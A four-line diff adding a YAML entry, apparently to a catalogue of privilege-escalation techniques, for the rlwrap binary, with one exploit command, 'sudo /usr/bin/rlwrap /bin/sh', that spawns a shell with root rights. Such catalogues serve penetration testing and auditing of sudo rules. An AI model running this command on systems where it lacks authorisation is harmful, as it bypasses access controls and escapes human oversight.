@@ -1,0 +1,4 @@
+name: rlwrap
+binary_path: /usr/bin/rlwrap
+exploit_cmds:
+- sudo /usr/bin/rlwrap /bin/sh
